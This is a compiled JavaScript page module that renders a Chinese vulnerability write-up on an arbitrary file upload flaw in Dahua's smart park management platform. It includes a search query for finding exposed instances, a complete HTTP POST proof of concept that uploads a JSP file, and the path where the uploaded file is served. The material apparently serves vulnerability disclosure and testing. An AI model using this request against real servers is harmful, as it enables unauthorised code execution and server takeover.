import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as n}from"./app-58e4a7d6.js";const d={},t=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>大华 智慧园区综合管理平台 video 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器中，控制服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>大华 智慧园区综合管理平台</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;dahua-智慧园区综合管理平台&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230704114553099.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /publishing/publishing/material/file/video HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 804
Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
Accept-Encoding: gzip, deflate
Connection: close

--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name=&quot;Filedata&quot;; filename=&quot;Test.jsp&quot;

Test
--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name=&quot;Submit&quot;

submit
--dd8f988919484abab3816881c55272a7--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828145833164.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/publishingImg/VIDEO/230812152005170200.jsp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,14),s=[t];function l(r,c){return i(),a("div",null,s)}const v=e(d,[["render",l],["__file","大华 智慧园区综合管理平台 video 任意文件上传漏洞.html.vue"]]);export{v as default};
